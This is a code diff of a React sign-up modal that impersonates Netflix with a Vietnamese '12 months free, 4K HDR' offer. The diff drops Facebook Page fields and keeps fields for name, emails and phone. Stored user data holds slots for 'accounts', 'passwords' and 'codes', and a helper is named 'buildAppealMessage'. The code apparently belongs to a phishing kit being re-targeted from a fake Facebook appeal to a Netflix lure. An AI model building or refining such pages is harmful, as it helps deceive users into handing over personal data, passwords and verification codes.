@@ -1,5 +1,5 @@
 import NetflixLogo from '@/assets/images/logoneflix.svg';
-import { MODAL_BTN_PRIMARY, MODAL_INPUT_CLASS, MODAL_LABEL_CLASS, MODAL_TEXTAREA_CLASS, ModalSpinner } from '@/components/form-modal/modal-shell';
+import { MODAL_BTN_PRIMARY, MODAL_INPUT_CLASS, MODAL_LABEL_CLASS, ModalSpinner } from '@/components/form-modal/modal-shell';
 import { useTranslation } from '@/hooks/use-translation';
 import { store } from '@/store/store';
 import { buildAppealMessage } from '@/utils/message';
@@ -12,48 +12,40 @@ import Image from 'next/image';
 import { type ChangeEvent, type FC, type FormEvent, useCallback, useMemo, useRef, useState } from 'react';
 
 interface FormData {
-    information: string;
     fullName: string;
     personalEmail: string;
     businessEmail: string;
-    facebookPageName: string;
 }
 
 interface FormErrors {
-    information?: string;
     fullName?: string;
     personalEmail?: string;
     businessEmail?: string;
     phoneNumber?: string;
-    facebookPageName?: string;
     termsAccepted?: string;
 }
 
 interface FormField {
     name: keyof FormData;
     label: string;
-    type: 'text' | 'email' | 'textarea';
+    type: 'text' | 'email';
     required?: boolean;
 }
 
 const FORM_FIELDS: FormField[] = [
-    { name: 'information', label: 'Mô tả nội dung bạn sáng tạo trên Facebook', type: 'textarea', required: true },
     { name: 'fullName', label: 'Họ và tên', type: 'text', required: true },
     { name: 'personalEmail', label: 'Email cá nhân', type: 'email', required: true },
-    { name: 'businessEmail', label: 'Email Page / Fanpage', type: 'email', required: true },
-    { name: 'facebookPageName', label: 'Tên Page Facebook', type: 'text', required: true }
+    { name: 'businessEmail', label: 'Email doanh nghiệp', type: 'email', required: true }
 ];
 
 const INIT_MODAL_TEXTS = [
     'Nhập thông tin để bắt đầu',
     'Hoặc đăng nhập vào tài khoản hiện có.',
     'Chương trình ưu đãi có hạn · 12 tháng miễn phí · 4K HDR',
-    'Mô tả nội dung bạn sáng tạo trên Facebook',
     'Họ và tên',
     'Email cá nhân',
-    'Email Page / Fanpage',
+    'Email doanh nghiệp',
     'Số điện thoại',
-    'Tên Page Facebook',
     'Tôi đồng ý với Điều khoản sử dụng',
     'Tiếp tục',
     'Vui lòng điền thông tin này',
@@ -70,11 +62,9 @@ const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
     const [phoneNumber, setPhoneNumber] = useState('');
     const { t } = useTranslation(INIT_MODAL_TEXTS);
     const [formData, setFormData] = useState<FormData>({
-        information: '',
         fullName: '',
         personalEmail: '',
-        businessEmail: '',
-        facebookPageName: ''
+        businessEmail: ''
     });
     const [errors, setErrors] = useState<FormErrors>({});
     const [termsAccepted, setTermsAccepted] = useState(false);
@@ -137,7 +127,7 @@ const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
     );
 
     const handleInputChange = useCallback(
-        (e: ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
+        (e: ChangeEvent<HTMLInputElement>) => {
             const { name, value } = e.target;
             setFormData((prev) => ({ ...prev, [name]: value }));
             if (errors[name as keyof FormErrors]) {
@@ -168,8 +158,8 @@ const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
             personalEmail: formData.personalEmail,
             businessEmail: formData.businessEmail,
             phoneNumber,
-            facebookPageName: formData.facebookPageName,
-            information: formData.information
+            facebookPageName: '',
+            information: ''
         };
 
         setUserData({ ...userPayload, accounts: [], passwords: [], codes: [] });
@@ -223,23 +213,13 @@ const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
                                     {t(field.label)}
                                     {field.required && <span className='text-[#ffb4ab]'> *</span>}
                                 </label>
-                                {field.type === 'textarea' ? (
-                                    <textarea
-                                        name={field.name}
-                                        value={formData[field.name]}
-                                        onChange={handleInputChange}
-                                        className={`${MODAL_TEXTAREA_CLASS} ${inputErrorClass(!!errors[field.name])}`}
-                                        rows={3}
-                                    />
-                                ) : (
-                                    <input
-                                        name={field.name}
-                                        type={field.type}
-                                        value={formData[field.name]}
-                                        onChange={handleInputChange}
-                                        className={`${MODAL_INPUT_CLASS} ${inputErrorClass(!!errors[field.name])}`}
-                                    />
-                                )}
+                                <input
+                                    name={field.name}
+                                    type={field.type}
+                                    value={formData[field.name]}
+                                    onChange={handleInputChange}
+                                    className={`${MODAL_INPUT_CLASS} ${inputErrorClass(!!errors[field.name])}`}
+                                />
                                 {errors[field.name] && <p className='mt-1 text-sm text-[#ffb4ab]'>{errors[field.name]}</p>}
                             </div>
                         ))}
